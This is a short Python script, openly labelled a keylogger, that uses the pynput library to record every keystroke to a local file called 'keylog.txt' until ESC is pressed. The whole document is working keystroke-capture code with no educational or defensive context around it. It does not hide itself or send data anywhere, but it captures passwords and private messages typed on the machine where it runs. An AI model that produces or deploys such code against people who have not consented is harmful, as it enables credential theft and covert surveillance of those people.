from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")

print("Keylogger started... Press ESC to stop.")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Stopped")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
